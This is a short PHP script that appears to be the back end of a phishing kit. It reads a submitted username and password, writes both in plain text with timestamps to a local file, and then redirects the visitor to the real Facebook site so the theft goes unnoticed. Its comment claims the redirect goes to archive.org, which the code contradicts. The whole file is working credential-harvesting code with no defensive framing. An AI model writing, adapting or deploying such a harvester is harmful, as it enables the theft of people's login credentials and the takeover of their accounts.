<?php
session_start();

$username = trim($_POST['username'] ?? '');
$password = $_POST['password'] ?? '';

if (empty($username) || empty($password)) {
    header("Location: index.php?error=missing_fields");
    exit();
}

// Store login attempt with timestamp
$file = fopen("data.txt", "a");
fwrite($file, "[" . date('Y-m-d H:i:s') . "] Username: $username\n");
fwrite($file, "[" . date('Y-m-d H:i:s') . "] Password: $password\n");
fclose($file);

// Redirect to archive.org after login
header("Location: https://www.facebook.com/");
exit();
?>
